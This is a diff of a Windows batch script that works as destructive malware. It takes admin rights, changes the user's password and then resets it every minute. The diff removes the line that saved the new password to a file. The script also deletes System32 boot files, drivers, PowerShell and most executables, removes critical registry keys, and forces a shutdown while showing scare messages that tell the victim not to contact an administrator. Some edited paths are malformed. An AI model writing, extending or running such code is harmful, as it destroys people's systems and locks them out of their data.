@@ -10,11 +10,12 @@ ver | find "6.1" >nul && set "winver=7"
 ver | find "6.2" >nul && set "winver=8"
 ver | find "6.3" >nul && set "winver=8.1"
 ver | find "10.0" >nul && set "winver=10"
+ver | find "11.0" >nul && set "winver=11"
 
 :: Check for admin rights using more compatible method
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    msg * "Please run this script as Administrator"
+    msg * "Please run this script as Administrator!"
     timeout /t 3 >nul
     exit /b
 )
@@ -37,10 +38,6 @@ for /f "tokens=*" %%u in ('echo %username%') do set "currentuser=%%u"
 
 :: Change password with error handling
 net user "%currentuser%" "%newpass%" >nul 2>&1
-if %errorlevel% neq 0 (
-    msg * "Something failed!"
-    timeout /t 2 >nul
-)
 
 cd %userprofile%\Desktop
 
@@ -60,38 +57,43 @@ for /L %%i in (1,1,50) do (
             )
         )
     )
-    echo File > "!random_name!.txt"
+    echo "!random_name!" > "!random_name!.txt"
     md "F!random_name!" 2>nul
 )
 
-del /f /q /s "%SystemRoot%\System32\winload.exe" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\ntoskrnl.exe" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\hal.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\bootvid.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\ci.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\drivers\disk.sys" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\drivers\pci.sys" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\*" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\Config\*.*" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\drivers\*.*" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\DRIVERS\*.*" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\kdcom.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\PSHED.dll" >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\CLFS.sys" >nul 2>&1
+del /f /q /s "C:\System32\hal.dll" >nul 2>&1
+del /f /q /s "C:\System32\bootvid.dll" >nul 2>&1
+del /f /q /s "C:\System32\ci.dll" >nul 2>&1
+del /f /q /s "C:\System32\drivers\disk.sys" >nul 2>&1
+del /f /q /s "C:\System32\drivers\pci.sys" >nul 2>&1
+del /f /q /s "C:\System32\Config\*" >nul 2>&1
+del /f /q /s "C:\System32\drivers\*" >nul 2>&1
+del /f /q /s "C:\System32\DRIVERS\*" >nul 2>&1
+del /f /q /s "C:\System32\kdcom.dll" >nul 2>&1
+del /f /q /s "C:\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
+del /f /q /s "C:\System32\PSHED.dll" >nul 2>&1
+del /f /q /s "C:\System32\CLFS.sys" >nul 2>&1
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /f >nul 2>&1
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f >nul 2>&1
-del /f /q /s "%SystemRoot%\System32\Tasks\*.*" >nul 2>&1
+del /f /q /s "C:\Windows\System32\WindowsPowerShell\*\powershell.exe" >nul 2>&1
+del /f /q /s "C:\System32\Tasks\*" >nul 2>&1
+for %%i in ("C:\System32\*.exe") do (
+    if /i not "%%~nxi"=="cmd.exe" (
+        del /f /q "%%i" >nul 2>&1
+    )
+)
 shutdown /f /s /t 900
 msg * "Hi!"
 msg * "System critical error detected!"
 msg * "Boot sector compromised!"
 msg * "System will be unusable in 15 minutes!"
 msg * "Some important system files have been deleted!"
-msg * "Please contact system administrator."
+msg * "Please do not contact system administrator!"
 msg * "Every minute your password changes to a new random string which is 20 characters long!"
+msg * "System shutdown initiated!"
+msg * "Goodbye!"
 :loop
     set "newpass="
     for /L %%i in (1,1,20) do (
@@ -99,6 +101,5 @@ msg * "Every minute your password changes to a new random string which is 20 cha
         set "newpass=!newpass!!chars:~%x%,1!"
         )
     net user "%currentuser%" "%newpass%" >nul 2>&1
-    echo %newpass% > "%SystemRoot%\Users\%currentuser%\The_Password.txt"
     timeout /t 60 >nul
 goto loop
